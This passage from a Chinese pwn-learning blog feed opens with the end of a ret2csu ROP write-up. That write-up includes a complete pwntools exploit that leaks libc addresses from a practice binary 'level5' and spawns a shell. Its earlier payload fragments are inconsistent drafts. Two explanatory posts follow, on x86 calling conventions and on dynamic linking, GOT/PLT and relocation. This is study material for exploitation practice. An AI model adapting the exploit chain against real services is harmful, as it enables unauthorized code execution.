的漏洞，我们需要继续覆盖栈上的数据，直到把返回值覆盖成目标函数的main函数为止。</p><p>总结一下我们要实现的payload需求：<code>rbx=0,rbp=1,r12=write_address,rdi=edi=r13,rsi=r14,rdx=r15</code>，<code>write(1,write_got,8)</code></p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">csu_end</span> = <span class="hljs-number">0</span><span class="hljs-variable">x400606</span><br><span class="hljs-variable">csu_front</span> = <span class="hljs-number">0</span><span class="hljs-variable">x4005F0</span><br><span class="hljs-variable">got_write</span> = <span class="hljs-variable">level5.got</span>[<span class="hljs-string">&#x27;write&#x27;</span>]<br><span class="hljs-variable">main_address</span> = <span class="hljs-number">0</span><span class="hljs-variable">x400564</span><br><br><span class="hljs-variable">payload</span> = <span class="hljs-variable">b</span><span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0</span><span class="hljs-variable">x80</span>+<span class="hljs-number">8</span>)<br><span class="hljs-variable">payload1</span> += <span class="hljs-function"><span class="hljs-title">p64</span>(<span class="hljs-variable">csu_end</span>) + <span class="hljs-title">p64</span>(<span class="hljs-number">0</span>) + <span class="hljs-title">p64</span>(<span class="hljs-number">1</span>) + <span class="hljs-title">p64</span>(<span class="hljs-variable">got_write</span>) + <span class="hljs-title">p64</span>(<span class="hljs-number">8</span>) + <span class="hljs-title">p64</span>(<span class="hljs-variable">got_write</span>) + <span class="hljs-title">p64</span>(<span class="hljs-number">1</span>)</span><br><span class="hljs-variable">payload</span> += <span class="hljs-function"><span class="hljs-title">p64</span>(<span class="hljs-variable">csu_front</span>)</span><br><span class="hljs-variable">payload</span> += <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0</span><span class="hljs-variable">x38</span><br><span class="hljs-variable">payload</span> += <span class="hljs-function"><span class="hljs-title">p64</span>(<span class="hljs-variable">main_address</span>)</span><br></code></pre></td></tr></table></figure><blockquote><p>write(1,write_got,8) 的含义为将 writ 函数的地址写入标准输出流中，写入的字节数为 8</p></blockquote><p>在收到write()在内存中的地址后，就可以计算出system()在内存中的地址。借此就可以将execve的地址以及“&#x2F;bin&#x2F;sh”读入到.bss段内存中。</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">bin_sh_str</span> = <span class="hljs-string">&#x27;/bin/sh\0&#x27;</span><br><span class="hljs-variable">bss_addr</span> = <span class="hljs-number">0</span><span class="hljs-variable">x601040</span><br><br><span class="hljs-variable">payload</span> = <span class="hljs-variable">b</span><span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0</span><span class="hljs-variable">x80</span>+<span class="hljs-number">8</span>)<br><span class="hljs-variable">payload1</span> += <span class="hljs-function"><span class="hljs-title">p64</span>(<span class="hljs-variable">csu_end</span>) + <span class="hljs-title">p64</span>(<span class="hljs-number">0</span>) + <span class="hljs-title">p64</span>(<span class="hljs-number">1</span>) + <span class="hljs-title">p64</span>(<span class="hljs-variable">read_got</span>) + <span class="hljs-title">p64</span>(<span class="hljs-number">16</span>) + <span class="hljs-title">p64</span>(<span class="hljs-variable">bss_base</span>) + <span class="hljs-title">p64</span>(<span class="hljs-number">0</span>)</span><br><span class="hljs-variable">payload</span> += <span class="hljs-function"><span class="hljs-title">p64</span>(<span class="hljs-variable">csu_front</span>)</span><br><span class="hljs-variable">payload</span> += <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0</span><span class="hljs-variable">x38</span><br><span class="hljs-variable">payload</span> += <span class="hljs-function"><span class="hljs-title">p64</span>(<span class="hljs-variable">main_address</span>)</span><br><span class="hljs-variable">sh.send</span>(<span class="hljs-function"><span class="hljs-title">p64</span>(<span class="hljs-variable">execve_addr</span>) + <span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)</span><br></code></pre></td></tr></table></figure><blockquote><p>read(0,bss_base,16) 的含义为从标准输入中读取最多 16 个字节的数据，并将数据存储到位于 <code>bss_base</code> 地址处的缓冲区中。</p></blockquote><p>最后调用执行 <code>execve(&#39;/bin/sh&#39;,0,0)</code></p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">payload</span> = <span class="hljs-variable">b</span><span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0</span><span class="hljs-variable">x80</span>+<span class="hljs-number">8</span>)<br><span class="hljs-variable">payload1</span> += <span class="hljs-function"><span class="hljs-title">p64</span>(<span class="hljs-variable">csu_end</span>) + <span class="hljs-title">p64</span>(<span class="hljs-number">0</span>) + <span class="hljs-title">p64</span>(<span class="hljs-number">1</span>) + <span class="hljs-title">p64</span>(<span class="hljs-variable">bss_base</span>) + <span class="hljs-title">p64</span>(<span class="hljs-number">0</span>) + <span class="hljs-title">p64</span>(<span class="hljs-number">0</span>) + <span class="hljs-title">p64</span>(<span class="hljs-variable">bss_base</span> + <span class="hljs-number">8</span>)</span><br><span class="hljs-variable">payload</span> += <span class="hljs-function"><span class="hljs-title">p64</span>(<span class="hljs-variable">csu_front</span>)</span><br><span class="hljs-variable">payload</span> += <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0</span><span class="hljs-variable">x38</span><br><span class="hljs-variable">payload</span> += <span class="hljs-function"><span class="hljs-title">p64</span>(<span class="hljs-variable">main_address</span>)</span><br></code></pre></td></tr></table></figure><p>总的exp为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> LibcSearcher<br><br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><br>level5 = ELF(<span class="hljs-string">&#x27;./level5&#x27;</span>)<br>sh = process(<span class="hljs-string">&#x27;./level5&#x27;</span>)<br><br>write_got = level5.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>read_got = level5.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br>main_addr = level5.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br>bss_base = level5.bss()<br>csu_front_addr = <span class="hljs-number">0x400600</span><br>csu_end_addr = <span class="hljs-number">0x40061A</span><br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">csu</span>(<span class="hljs-params">rbx, rbp, r12, r13, r14, r15, last</span>):<br>    payload = <span class="hljs-string">&#x27;a&#x27;</span> * (<span class="hljs-number">0x80</span> + <span class="hljs-number">8</span>)<br>    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(<br>        r13) + p64(r14) + p64(r15)<br>    payload += p64(csu_front_addr)<br>    payload += <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x38</span><br>    payload += p64(last)<br>    sh.send(payload)<br>    sleep(<span class="hljs-number">1</span>)<br><br><br>sh.recvuntil(<span class="hljs-string">&#x27;Hello, World\n&#x27;</span>)<br><span class="hljs-comment">## RDI, RSI, RDX, RCX, R8, R9, more on the stack</span><br><span class="hljs-comment">## write(1,write_got,8)</span><br>csu(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, write_got, <span class="hljs-number">8</span>, write_got, <span class="hljs-number">1</span>, main_addr)<br><br>write_addr = u64(sh.recv(<span class="hljs-number">8</span>))<br>libc = LibcSearcher(<span class="hljs-string">&#x27;write&#x27;</span>, write_addr)<br>libc_base = write_addr - libc.dump(<span class="hljs-string">&#x27;write&#x27;</span>)<br>execve_addr = libc_base + libc.dump(<span class="hljs-string">&#x27;execve&#x27;</span>)<br>log.success(<span class="hljs-string">&#x27;execve_addr &#x27;</span> + <span class="hljs-built_in">hex</span>(execve_addr))<br><br><span class="hljs-comment">## read(0,bss_base,16)</span><br><span class="hljs-comment">## read execve_addr and /bin/sh\x00</span><br>sh.recvuntil(<span class="hljs-string">&#x27;Hello, World\n&#x27;</span>)<br>csu(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, read_got, <span class="hljs-number">16</span>, bss_base, <span class="hljs-number">0</span>, main_addr)<br>sh.send(p64(execve_addr) + <span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br><br>sh.recvuntil(<span class="hljs-string">&#x27;Hello, World\n&#x27;</span>)<br><span class="hljs-comment">## execve(bss_base+8,0,0)</span><br>csu(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, bss_base, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, bss_base + <span class="hljs-number">8</span>, main_addr)<br>sh.interactive()<br></code></pre></td></tr></table></figure><hr><p>很菜菜的ROP，把笔记收拾收拾发一下。</p><p>本来想说栈上全部东西都搞完再发，但最近github上的绿点点都少了就提前发一部分喽😢</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>栈</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>函数调用约定</title>
    <link href="/2023/06/19/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A/"/>
    <url>/2023/06/19/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A/</url>
    
    <content type="html"><![CDATA[<p>函数参数怎么传递和由谁清除堆栈</p><span id="more"></span><p>炒冷饭，都快要忘记自己有一个博客了 (x</p><h1 id="什么是函数调用约定"><a href="#什么是函数调用约定" class="headerlink" title="什么是函数调用约定"></a>什么是函数调用约定</h1><p>在函数被调用的过程中，编译器都进行了以下的工作：</p><ol><li><p>把调用者的地址压入栈</p></li><li><p>把函数的参数压入栈或者存储到寄存器当中</p></li><li><p>调转到被引用函数</p></li><li><p>把函数使用的寄存器压入栈</p></li><li><p>执行函数</p></li><li><p>处理函数返回值</p></li><li><p>将第三步中压栈的寄存器恢复到原始值</p></li><li><p>清空第一部中的压栈参数和处理返回地址</p></li><li><p>返回到调用者调用时的地址（即步骤一时记录的地址）</p></li></ol><p>函数调用约定，就是对函数调用的一个约束和规定(规范)，描述了函数参数是怎么传递和由谁清除堆栈的。（堆栈平衡？）</p><blockquote><p>x64的前四个参数使用rcx，rdx，r8，r9传递，之后的参数通过栈来传递</p></blockquote><p>它决定以下三个方面：</p><ul><li>函数参数传递的方式（是否采用寄存器传递函数，采用那个寄存器调用函数，参数压栈顺序等）</li><li>函数调用结束后的栈指针由谁恢复（被调用者恢复或是被调用的函数恢复）</li><li>函数修饰名的产生方法</li></ul><p>我们构造一个函数的时候，会规定返回类型和函数名（参数列表），如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">funcA</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">funcB</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span>; <br></code></pre></td></tr></table></figure><p>除此之外，还有另外一部分，就是函数的调用约定，由系统自动生成，也可以有我们来手动编写规定，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __cdecl <span class="hljs-title function_">funA</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> __stdcall <span class="hljs-title function_">funcB</span><span class="hljs-params">()</span>;<br></code></pre></td></tr></table></figure><h4 id="常见的调用约定"><a href="#常见的调用约定" class="headerlink" title="常见的调用约定"></a>常见的调用约定</h4><ul><li>c：__cdecl 、__stdcall、__fastcall、naked、__pascall</li><li>c++：__cdecl 、__stdcall、__fastcall、naked、__pascall、__thiscall</li></ul><h4 id="调用约定的使用"><a href="#调用约定的使用" class="headerlink" title="调用约定的使用"></a>调用约定的使用</h4><p>调用约定书写在函数的前面，相当于函数类型的一部分。要求函数的声明和定义要有相同的调用约定。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">Add</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span>;   <span class="hljs-comment">//默认是__cdecl</span><br><span class="hljs-type">int</span> __stdcall <span class="hljs-title function_">Add</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> a+b;<br>&#125;<br></code></pre></td></tr></table></figure><p>以上在编译过程中就会提示出错，因为声明和定义的调用约定不同。正确应该是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __stdcall <span class="hljs-title function_">Add</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span>;<br><span class="hljs-type">int</span> __stdcall <span class="hljs-title function_">Add</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> a+b;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="不同调用下的规则"><a href="#不同调用下的规则" class="headerlink" title="不同调用下的规则"></a>不同调用下的规则</h1><p>首先我们定义两个概念，即“被调用者”和“调用者”。如下Add()函数就是“被调用者”，ShoowResult()函数就是“调用者”。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">Add</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> a+b;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">ShowResult</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    cout&lt;&lt;<span class="hljs-built_in">add</span>(<span class="hljs-number">5</span>,<span class="hljs-number">10</span>)&lt;&lt;endl;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="cdecl"><a href="#cdecl" class="headerlink" title="__cdecl"></a>__cdecl</h2><p>__cdecl是C Declaration的缩写，表示C\C++默认的函数调用约定</p><h4 id="调用方式"><a href="#调用方式" class="headerlink" title="调用方式"></a>调用方式</h4><ul><li>采用栈传递参数，参数<strong>从右向左</strong>依次入栈</li><li>由调用者恢复栈顶指针</li><li>编译器在编译时会在函数名前加上一个下划线前缀生成修饰名，格式为_function。如Add()的修饰名是_Add()</li></ul><blockquote><p>注意：调用参数个数可变的函数只能采用这种方式</p></blockquote><h2 id="stdcall"><a href="#stdcall" class="headerlink" title="__stdcall"></a>__stdcall</h2><p>__stdcall是Standard Call的缩写，是C++的标准调用方式。</p><h4 id="调用方式-1"><a href="#调用方式-1" class="headerlink" title="调用方式"></a>调用方式</h4><ul><li>采用栈传递参数，参数<strong>从右向左</strong>依次入栈</li><li>由被调用者负责恢复栈顶指针</li><li>在输出函数名前加上一个下划线前缀，后面加一个@符号和其参数的字节数，格式为_function@number。如函数Add的修饰名是_Add@8</li></ul><p>__stdcall与__cdecl最主要的区别是第2条规定：由“被调用者”清空实际上就是把对应参数数目的数据从栈中弹出，这样的缺点就是它不能使用于那些不确定数目参数的函数。</p><p>好处在于只需要在函数内部编译出恢复栈顶的代码，而调用者恢复则需要在调用出编译出恢复栈顶的代码。</p><h2 id="fastcall"><a href="#fastcall" class="headerlink" title="__fastcall"></a>__fastcall</h2><p>__fastcall是快速调用，因为有部分参数可以通过寄存器直接传递，效率比较高。</p><h4 id="调用方式-2"><a href="#调用方式-2" class="headerlink" title="调用方式"></a>调用方式</h4><ul><li>函数的第一个和第二个（<strong>从左向右</strong>）32字节参数（或者尺寸更小的）通过ecx和edx传递（寄存器传递），其他参数通过桟传递。从第三个参数（如果有的话）开始<strong>从右向左</strong>的顺序压栈</li><li>由被调用者恢复栈顶指针</li><li>在函数名前加上@，在函数名后加@和参数字节数，格式为@function@number</li></ul><h2 id="thiscall"><a href="#thiscall" class="headerlink" title="__thiscall"></a>__thiscall</h2><p>__thiscall是唯一一个不能明确指明的函数修饰，因为thiscall只能用于C++类成员函数的调用，同时thiscall也是C++成员函数缺省的调用约定。由于成员函数调用还有一个this指针，因此必须特殊处理。</p><h4 id="调用方式-3"><a href="#调用方式-3" class="headerlink" title="调用方式"></a>调用方式</h4><ul><li>采用栈传递参数，参数<strong>自右向左</strong>入栈</li><li>如果参数的个数确定，this指针通过ecx传递给被调用者；如果参数个数不确定，this指针在所有参数压栈后被压入堆栈</li><li>对于参数个数不确定的由调用者问清理堆栈，否则由被调函数清理。</li></ul>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>动态链接GOT与PLT</title>
    <link href="/2023/04/13/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5GOT%E4%B8%8EPLT/"/>
    <url>/2023/04/13/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5GOT%E4%B8%8EPLT/</url>
    
    <content type="html"><![CDATA[<p>主要是动态链接的一些内容</p><span id="more"></span><p>断断续续磨了一个周，本来只是想学一下got表后来发现越挖越深什么都不会，大致了解一下，最后写出了这样一个网络垃圾（x</p><h1 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h1><p><strong>链接就是把目标文件与一些库文件生成可执行文件的一个过程。</strong></p><h3 id="编译过程"><a href="#编译过程" class="headerlink" title="编译过程"></a>编译过程</h3><p>要了解“链接”的概念，首先要了解C语言编译生成可执行文件的过程：(1) 预处理；(2) 编译；(3) 汇编；(4) 链接；</p><h5 id="01-预处理"><a href="#01-预处理" class="headerlink" title="01 预处理"></a>01 预处理</h5><p>使用预处理器把源文件<code>test.c</code>经过预处理生成<code>test.i</code>文件，预处理用于将所有的<code>#include</code>头文件以及宏定义替换成其真正的内容，其中<code>test.i</code>是文本文件。</p><p>这里是一个c语言的源文件：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&#x27;This is a test program!\n&#x27;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>gcc处理命令为：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">gcc -E test.c -o test.i   #-E是让编译器在预处理之后就退出，不进行后续编译过程；-o是指定输出文件名。<br></code></pre></td></tr></table></figure><p>处理后的test.i文件就会变得很长很长，以下是部分截图：</p><p><img src="/img/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5GOT%E4%B8%8EPLT/Snipaste_2023-04-08_20-09-26.png"></p><h5 id="02-编译"><a href="#02-编译" class="headerlink" title="02 编译"></a>02 编译</h5><p>使用编译器将预处理文件<code>test.i</code>编译成汇编文件<code>test.s</code>，其中<code>test.s</code>是文本文件。</p><p>gcc命令为：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">gcc -S test.i -o test.s   #-S让编译器在编译之后停止，不进行后续过程；-o是指定输出文件名<br></code></pre></td></tr></table></figure><p>处理后的test.s文件又变得短短的了</p><p><img src="/img/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5GOT%E4%B8%8EPLT/Snipaste_2023-04-08_20-19-27.png"></p><h5 id="03-编译"><a href="#03-编译" class="headerlink" title="03 编译"></a>03 编译</h5><p>使用汇编器将汇编文件<code>test.s</code>转换成目标文件<code>test.o</code>，其中<code>test.o</code>是二进制文件。</p><p>汇编过程的命令为：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">gcc -c test.s -o test.o   #-c让汇编器把汇编文件test.s转换成目标文件test.o。<br></code></pre></td></tr></table></figure><h5 id="04-链接"><a href="#04-链接" class="headerlink" title="04 链接"></a>04 链接</h5><p>链接过程使用链接器将该目标文件与其他目标文件、库文件、启动文件等链接起来生成可执行文件。</p><p>该步骤的命令为：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">gcc test.o test.exe-E <br></code></pre></td></tr></table></figure><p>拖进IDA就是我们比较熟悉的样子了</p><p><img src="/img/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5GOT%E4%B8%8EPLT/Snipaste_2023-04-08_20-42-21.png"></p><h3 id="动态链接库"><a href="#动态链接库" class="headerlink" title="动态链接库"></a>动态链接库</h3><p>我们在写程序的时候，通常不会完全靠自己来实现所有功能，我们会调用我们所需要的系统库或者第三方库来实现我们的功能，这些库就是动态链接库。</p><blockquote><p>动态链接库可以映射到不同进程的不同虚拟地址，所以属于“地址无关代码”。</p></blockquote><p>🌰：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>* argv[])</span> &#123;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">32</span>];<br>    <span class="hljs-built_in">strncpy</span>(buf, <span class="hljs-string">&quot;Hello, World\n&quot;</span>, <span class="hljs-number">32</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>,buf);<br>&#125;<br></code></pre></td></tr></table></figure><p>在这段代码中我们调用了系统库，在编译完成后可以查看文件的symbol。会发现在printf和strncpy前面都是没有定义的，这就是用于支持动态连接功能的。</p><blockquote><p>两种命令可以随意挑选，但结果不太一样，还没搞明白😳</p><p><code>nm -g [filename]</code></p><p><code>readelf  -s [filename]</code></p></blockquote><p><img src="/img/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5GOT%E4%B8%8EPLT/Snipaste_2023-04-10_18-30-06.png"></p><p>通过objdump命令查看相关函数的反汇编模块 <code>objdump -D [filename]</code>（在.plt部分）</p><p><img src="/img/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5GOT%E4%B8%8EPLT/Snipaste_2023-04-10_21-05-57.png"></p><p>可以看到，程序首先进行jupq操作跳转到相应的代码段，这个代码段就是用于给“地址无关代码”做动态地址重定位，链接器将这个函数的调用代码跳转到程序运行时的动态装载地址。</p><h3 id="链接器"><a href="#链接器" class="headerlink" title="链接器"></a>链接器</h3><p>链接器（Linker）是一个程序，将一个或多个由编译器或汇编器生成的目标文件外加库链接为一个可执行文件。目标文件是包括机器码和链接器可用信息的程序模块。</p><p>简单的讲，<strong>链接器的工作就是解析未定义的符号引用，将目标文件中的占位符替换为符号的地址</strong>。</p><p>链接器还要完成程序中各目标文件的地址空间的组织，涉及重定位工作。</p><h5 id="链接器的工作步骤"><a href="#链接器的工作步骤" class="headerlink" title="链接器的工作步骤"></a>链接器的工作步骤</h5><ul><li>将代码和数据模块象征性地放入内存</li><li>决定数据和指令标签的地址</li><li>修补内部和外部引用</li></ul><h5 id="链接器需要对动态链接库做的情"><a href="#链接器需要对动态链接库做的情" class="headerlink" title="链接器需要对动态链接库做的情"></a>链接器需要对动态链接库做的情</h5><ul><li>链接库在将目标文件链接成可执行文件的的时候，如果发现某一个变量或者函数在目标中找不到，就会按照 gcc 预定义的动态库寻找动态库中定义的变量或者函数</li><li>如果链接库在某一动态库中找到了该变量或者函数的定义，链接库首先会把这个动态链接库写到可执行文件的依赖库中，然后生成这个当前变量或者函数的代理symbol</li><li>在偏移表中生成真正的动态跳转指令，并且在库函数代理symbol中跳转到相应的偏移位置</li></ul><h3 id="重定位"><a href="#重定位" class="headerlink" title="重定位"></a>重定位</h3><p>重定位（Relocations）就是把程序的逻辑地址变换成为内存中的实际地址空间的过程。</p><p>重定位分为两步：</p><ul><li>重定位节和符号引用</li></ul><p>在这一步中，连接器将所有相同类型的节合并为同一类型的新聚节。随后链接器把运行时的内存赋值给新的聚合节，赋给输入模块定义的每个节，以及赋给输入模块的每个符号。</p><blockquote><p>e.g.所有输入模块的.data节被合并为一个节，这个节成为输入的可执行目标文件的.data节。</p></blockquote><p>当这一步完成，程序中的每条指令和全局变量都有唯一的运行时的内存地址了。</p><ul><li>重定位节中的符号引用</li></ul><p>在这一步中，链接器修改代码节和数据节中对每个符号的引用，使得他们指向正确的运行地址。</p><p>其中，链接器执行这一步需要依靠可重定位目标模块中成为<strong>重定位条目</strong>的数据结构。</p><h5 id="重定位条目"><a href="#重定位条目" class="headerlink" title="重定位条目"></a>重定位条目</h5><p>当汇编器生成一个目标模块时，他并不知道数据和代码最终会被放在内存的那个位置，也不知道这个模块引用的外部定义的函数或者全局变量的位置。所以，当汇编器遇到一个对最终位置未知的目标引用，它就会生成一个重定位条目，告诉连接器将目标文件合并成可执行文件时如何修改这个引用。</p><p>代码的重定位条目放在<code>.rel.text</code>中，已经初始化数据的重定位条目放在<code>.rel.data</code>中。</p><p>重定位条目分为两种格式：<code>Rel</code>和<code>Rela</code>。每个重定位条目表示一个必须被重定位的符号引用，并指明如何计算被修改的符号引用。</p><blockquote><p>重定位条目<code>Rel</code>和<code>Rela</code>之间的唯一区别：<code>Rel</code>中没有<code>Addend</code>字段。</p></blockquote><p>查看文件中的重定位信息：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">readelf -r [filename]<br></code></pre></td></tr></table></figure><p><img src="/img/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5GOT%E4%B8%8EPLT/Snipaste_2023-04-12_21-32-29.png"></p><ul><li><p><code>Offset</code>是 Relocation Entry 结构体中的第 1 个字段，占用 8 字节，表示<strong>需要修改的符号引用的位置</strong>。</p><ul><li><p>对于可重定位目标文件，该字段表示需要修改的符号引用的起始位置在目标 section （<code>.rela.text</code>中的重定位条目对应的目标 section 为<code>.text</code>，<code>.rela.data</code>中的重定位条目对应的目标 section 为<code>.data</code>，以此类推）中的偏移量（字节）。</p></li><li><p>对于可执行目标文件和可共享目标文件，该字段表示需要修改的符号引用的起始位置所对应的虚拟内存地址。</p></li></ul></li><li><p><code>Info</code>是 Relocation Entry 结构体中的第 2 个字段，占用 8 字节，表示<strong>符号表索引和重定位类型</strong>（符号表索引占用高 32 位，重定位类型占用低 32 位）。</p><ul><li><p>符号表索引表示需要修改的符号引用在<code>.symtab</code>section中的索引。这里的<code>Sym. Value</code>和<code>Sym. 